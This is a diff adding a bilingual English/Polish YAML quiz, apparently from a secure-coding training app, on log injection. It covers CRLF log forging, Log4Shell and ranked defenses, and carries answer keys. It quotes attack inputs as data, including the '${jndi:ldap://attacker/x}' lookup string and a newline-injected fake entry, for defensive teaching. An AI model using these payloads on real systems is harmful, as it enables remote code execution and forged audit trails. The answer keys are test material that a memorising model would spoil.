@@ -1,0 +1,98 @@
+threatId: "1.7"
+title:
+  en: 'Log Injection'
+  pl: 'Wstrzyknięcie do logów (Log Injection)'
+passScore: 80
+questions:
+  - id: 'q1'
+    type: 'vuln-or-not'
+    prompt:
+      en: 'This Python code logs a user-supplied value. Is it vulnerable to log injection?'
+      pl: 'Ten kod Pythona loguje wartość od użytkownika. Czy jest podatny na log injection?'
+    snippet:
+      lang: 'python'
+      code: |
+        # user_input arrives straight from the request
+        logging.info(f"User: {user_input}")   # "a\nFAKE ..." -> fake entry
+    isVulnerable: true
+    cwe: 'CWE-117'
+    explanation:
+      en: 'Vulnerable. The f-string interpolates raw input into the message, so an injected \r\n forges an entirely new synthetic log line attributed to an arbitrary IP or user (CWE-117). The fix is to strip CR/LF and use lazy %-args: logging.info("User: %s", clean).'
+      pl: 'Podatny. F-string wstawia surowe wejście do wiadomości, więc wstrzyknięty \r\n fałszuje całkowicie nową syntetyczną linię logu przypisaną do dowolnego IP lub konta (CWE-117). Naprawa: usuń CR/LF i użyj leniwych %-argów: logging.info("User: %s", clean).'
+  - id: 'q2'
+    type: 'multiple-choice'
+    prompt:
+      en: 'Which single logged string escalated log injection from a Medium issue into a CVSS 10.0 RCE, and which patch closes that escalation path?'
+      pl: 'Który pojedynczy logowany string wyeskalował log injection z problemu Medium do RCE o CVSS 10.0 i jaka łatka zamyka tę ścieżkę eskalacji?'
+    choices:
+      - id: 'a'
+        label:
+          en: '${jndi:ldap://attacker/x} triggers a JNDI lookup and remote class loading; upgrade Log4j2 to 2.17.1+, which disables JNDI lookups by default.'
+          pl: '${jndi:ldap://attacker/x} wyzwala lookup JNDI i zdalne ładowanie klas; aktualizacja Log4j2 do 2.17.1+ domyślnie wyłącza lookupy JNDI.'
+      - id: 'b'
+        label:
+          en: '<script>fetch(...)</script> stored in a log; enable Content-Security-Policy.'
+          pl: '<script>fetch(...)</script> zapisany w logu; włącz Content-Security-Policy.'
+      - id: 'c'
+        label:
+          en: '\x1b[2J clear-screen ANSI sequence; switch log viewers to a GUI.'
+          pl: 'Sekwencja ANSI \x1b[2J czyszcząca ekran; przełącz podgląd logów na GUI.'
+      - id: 'd'
+        label:
+          en: 'Bulk 200 OK entries; raise the SIEM alert threshold.'
+          pl: 'Masowe wpisy 200 OK; podnieś próg alertów SIEM.'
+    correctChoiceIds: ['a']
+    explanation:
+      en: 'Log4Shell (CVE-2021-44228): ${jndi:ldap://...} in any logged field triggers a JNDI lookup, remote class loading, and full RCE. Upgrading Log4j2 to 2.17.1+ (2.12.4+ on Java 7, 2.3.2+ on Java 6) disables JNDI lookups by default and closes the escalation.'
+      pl: 'Log4Shell (CVE-2021-44228): ${jndi:ldap://...} w dowolnym logowanym polu wyzwala lookup JNDI, zdalne ładowanie klas i pełne RCE. Aktualizacja Log4j2 do 2.17.1+ (2.12.4+ na Java 7, 2.3.2+ na Java 6) domyślnie wyłącza lookupy JNDI i zamyka eskalację.'
+  - id: 'q3'
+    type: 'pick-the-fix'
+    prompt:
+      en: 'The vulnerable code is logging.info(f"User: {user_input}"). Which variant is the correct fix against CRLF log forging?'
+      pl: 'Podatny kod to logging.info(f"User: {user_input}"). Który wariant poprawnie naprawia CRLF log forging?'
+    variants:
+      - id: 'v1'
+        lang: 'python'
+        code: |
+          clean = user_input.replace('\n', '').replace('\r', '')
+          logging.info("User: %s", clean)
+      - id: 'v2'
+        lang: 'python'
+        code: |
+          clean = user_input.replace('\n', '')
+          logging.info("User: %s", clean)
+      - id: 'v3'
+        lang: 'python'
+        code: |
+          import html
+          logging.info("User: %s", html.escape(user_input))
+    correctVariantId: 'v1'
+    explanation:
+      en: 'v1 strips both \r and \n before logging (rank-2 sanitization) so no new line can be forged. v2 removes only \n and leaves \r, which on many viewers still starts a fresh line / overwrites — a partial control sequence. v3 HTML-escapes, which only addresses the log-poisoning XSS variant in a dashboard; the raw \r\n pass through and forging still works.'
+      pl: 'v1 usuwa i \r, i \n przed logowaniem (sanityzacja rangi 2), więc nie da się sfałszować nowej linii. v2 usuwa tylko \n i zostawia \r, które na wielu podglądach nadal zaczyna nową linię / nadpisuje — częściowa sekwencja kontrolna. v3 HTML-escapuje, co adresuje jedynie wariant log-poisoning XSS w dashboardzie; surowe \r\n przechodzą i forging nadal działa.'
+  - id: 'q4'
+    type: 'multiple-choice'
+    prompt:
+      en: 'Ranked by effectiveness, which is the primary (rank-1) defense against log injection?'
+      pl: 'Uszeregowana wg skuteczności — jaka jest podstawowa (ranga 1) obrona przed log injection?'
+    choices:
+      - id: 'a'
+        label:
+          en: 'Structured logging (JSON key-value: pino, Serilog, structlog, logback) — input is a data field, so an injected \n produces an invalid record the shipper rejects.'
+          pl: 'Logowanie strukturalne (JSON klucz-wartość: pino, Serilog, structlog, logback) — wejście jest polem danych, więc wstrzyknięty \n daje nieprawidłowy rekord odrzucany przez shipper.'
+      - id: 'b'
+        label:
+          en: 'WORM log shipping (S3 Object Lock / Azure Immutable Blob).'
+          pl: 'Wysyłka logów WORM (S3 Object Lock / Azure Immutable Blob).'
+      - id: 'c'
+        label:
+          en: 'A WAF blocking CRLF and XSS payloads in headers.'
+          pl: 'WAF blokujący ładunki CRLF i XSS w nagłówkach.'
+      - id: 'd'
+        label:
+          en: 'An IAM no-delete policy on the log bucket.'
+          pl: 'Polityka IAM bez usuwania na buckecie logów.'
+    correctChoiceIds: ['a']
+    explanation:
+      en: 'Structured logging (rank 1, eff 100) treats user input as data rather than structure, so injected newlines cannot forge entries. WORM shipping (rank 4) and the IAM no-delete policy (rank 7) protect against post-write tampering but still preserve pre-write injection — they reduce blast radius, they do not fix the root cause.'
+      pl: 'Logowanie strukturalne (ranga 1, eff 100) traktuje wejście jako dane, nie strukturę, więc wstrzyknięte nowe linie nie sfałszują wpisów. Wysyłka WORM (ranga 4) i polityka IAM bez usuwania (ranga 7) chronią przed manipulacją po zapisie, ale utrwalają wstrzyknięcie przed zapisem — ograniczają skutki, nie usuwają przyczyny.'
